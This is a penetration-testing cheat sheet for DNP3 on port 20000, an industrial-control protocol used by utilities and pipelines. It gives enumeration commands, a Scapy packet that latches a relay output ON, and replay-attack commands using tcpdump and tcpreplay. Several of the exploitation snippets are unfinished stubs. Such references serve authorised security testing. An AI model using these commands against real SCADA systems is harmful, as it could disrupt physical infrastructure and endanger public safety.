# Port 20000 - DNP3

## Table of Contents

- [Overview](#overview)
- [Enumeration](#enumeration)
- [Read/Write Data](#readwrite-data)
- [Exploitation](#exploitation)

---

## Overview

| Port | Protocol | Description |
| :--- | :--- | :--- |
| 20000 | DNP3/TCP | Distributed Network Protocol 3 |
| 20000/UDP | DNP3/UDP | DNP3 over UDP |

DNP3 is used in:

- Electric utilities (SCADA)
- Water/wastewater systems
- Oil and gas pipelines
- Transportation systems

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -p 20000 --script "dnp3-info" $rhost
```

### Nmap

```shell
nmap -sV -p 20000 $rhost
nmap -p 20000 --script "dnp3-info" $rhost
```

### Metasploit

```shell
# DNP3 enumeration
use auxiliary/scanner/scada/dnp3_info
set RHOSTS $rhost
run
```

### Using pydnp3

```python
#!/usr/bin/env python3
from pydnp3 import opendnp3, asiodnp3, asiopal

# Configuration for DNP3 master
config = asiodnp3.MasterStackConfig()
config.master.responseTimeout = asiopal.TimeDuration.Seconds(5)

# Connect and query
# (Full implementation requires more setup)
```

---

## Read/Write Data

### DNP3 Data Types

| Type | Description |
| :--- | :--- |
| Binary Input | Digital inputs (0/1) |
| Binary Output | Digital outputs (0/1) |
| Analog Input | Analog measurements |
| Analog Output | Analog setpoints |
| Counter | Event counters |

### Read with Scapy

```python
#!/usr/bin/env python3
from scapy.all import *
from scapy.contrib.dnp3 import *

# Build DNP3 read request
pkt = DNP3(
    ctrl=DNP3HeaderControl(DIR=1, PRM=1, FCB=0, FCV=0, FUNC_CODE_PRI=0),
    src=1,
    dst=10,
) / DNP3ApplicationRequest(
    FUNC_CODE=1,  # Read
) / DNP3ApplicationObjectHeader(
    object_type=1,  # Binary Input
    range_specifier=0x06,  # All objects
)

target_host = "TARGET_IP"  # Replace with target

# Send
response = sr1(IP(dst=target_host)/TCP(dport=20000)/pkt, timeout=5)
```

### Control Operations

```python
#!/usr/bin/env python3
# Direct Operate (turn ON/OFF)
from scapy.all import *
from scapy.contrib.dnp3 import *

# Build control request
pkt = DNP3(
    src=1,
    dst=10,
) / DNP3ApplicationRequest(
    FUNC_CODE=3,  # Direct Operate
) / DNP3ApplicationObjectHeader(
    object_type=12,  # Control Relay Output Block
    range_specifier=0x17,
) / DNP3Object12(
    control_code=0x03,  # Latch ON
    count=1,
    on_time=0,
    off_time=0,
)
```

---

## Exploitation

### Change Setpoints

```python
#!/usr/bin/env python3
# ⚠️ Only for authorized testing!
# Change analog output setpoint

# This requires proper DNP3 library implementation
# Example: changing voltage setpoint in a substation
```

### Replay Attack

```shell
# Capture DNP3 traffic
tcpdump -i eth0 port 20000 -w dnp3_capture.pcap

# Replay commands
tcpreplay -i eth0 dnp3_capture.pcap
```

### Fuzzing

```shell
# Using boofuzz
# DNP3 fuzzing requires custom protocol definition
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| Nmap | `nmap -p 20000 --script "dnp3-info" $rhost` | Enumerate |
| Metasploit | `use auxiliary/scanner/scada/dnp3_info` | Scan DNP3 |
| Wireshark | `dnp3` filter | Analyze traffic |

| Function Code | Description |
| :--- | :--- |
| 0x01 | Read |
| 0x02 | Write |
| 0x03 | Direct Operate |
| 0x04 | Direct Operate No Ack |
| 0x0D | Cold Restart |
| 0x0E | Warm Restart |
